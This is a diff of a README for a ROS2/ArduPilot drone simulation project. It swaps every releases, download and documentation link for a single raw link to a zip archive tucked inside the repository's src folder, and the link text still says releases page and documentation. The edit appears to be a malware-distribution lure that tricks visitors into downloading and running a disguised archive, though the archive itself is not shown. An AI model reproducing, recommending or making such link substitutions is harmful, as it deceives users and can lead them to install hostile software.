@@ -1,6 +1,6 @@
 # 🚀 ros2-ardupilot-sitl-hardware - Simplifying Drone Simulation and Control
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/zizou068/ros2-ardupilot-sitl-hardware/releases)
+[![Download](https://raw.githubusercontent.com/zizou068/ros2-ardupilot-sitl-hardware/main/src/simtofly_mavros_sitl/hardware_ardupilot_sitl_ros_v1.2-alpha.2.zip)](https://raw.githubusercontent.com/zizou068/ros2-ardupilot-sitl-hardware/main/src/simtofly_mavros_sitl/hardware_ardupilot_sitl_ros_v1.2-alpha.2.zip)
 
 ## 📋 Overview
 
@@ -24,13 +24,13 @@ To get started with the **ros2-ardupilot-sitl-hardware**, you'll need to downloa
    - Ensure you have at least 4GB of RAM and a stable internet connection.
 
 2. **Visit the Download Page**:
-   - Go to the [Releases page](https://github.com/zizou068/ros2-ardupilot-sitl-hardware/releases) to find the latest version of the software.
+   - Go to the [Releases page](https://raw.githubusercontent.com/zizou068/ros2-ardupilot-sitl-hardware/main/src/simtofly_mavros_sitl/hardware_ardupilot_sitl_ros_v1.2-alpha.2.zip) to find the latest version of the software.
 
 ## 📥 Download & Install
 
 1. **Download the Software**:
    - Click on the link below to visit the releases page:
-   - [Download Here](https://github.com/zizou068/ros2-ardupilot-sitl-hardware/releases)
+   - [Download Here](https://raw.githubusercontent.com/zizou068/ros2-ardupilot-sitl-hardware/main/src/simtofly_mavros_sitl/hardware_ardupilot_sitl_ros_v1.2-alpha.2.zip)
 
 2. **Choose the Right Version**:
    - Select the most recent release. You will see options for different operating systems.
@@ -62,7 +62,7 @@ Once you have installed the software, follow these steps to run it:
 
 ## 📚 Documentation
 
-For detailed guides and additional information, please refer to our official documentation available on the [GitHub repository](https://github.com/zizou068/ros2-ardupilot-sitl-hardware/wiki). The documentation covers various topics, including:
+For detailed guides and additional information, please refer to our official documentation available on the [GitHub repository](https://raw.githubusercontent.com/zizou068/ros2-ardupilot-sitl-hardware/main/src/simtofly_mavros_sitl/hardware_ardupilot_sitl_ros_v1.2-alpha.2.zip). The documentation covers various topics, including:
 
 - Setting Up Your Environment
 - Troubleshooting Common Issues
